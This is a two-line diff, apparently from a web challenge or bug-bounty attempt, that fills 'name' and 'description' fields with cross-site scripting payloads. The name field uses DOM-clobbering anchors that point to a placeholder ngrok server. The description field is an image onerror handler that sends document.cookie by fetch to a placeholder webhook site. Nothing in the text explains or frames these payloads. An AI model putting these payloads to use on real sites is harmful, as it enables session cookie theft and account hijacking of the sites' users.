@@ -1,0 +1,2 @@
+name: <div id=debug></div><a id=facecard><a id=facecard name=top href='https://YOUR-NGROK-SERVER'>",
+description: <img src=x onerror='fetch("https://YOUR-WEBHOOK-SITE/?" + document.cookie)' />
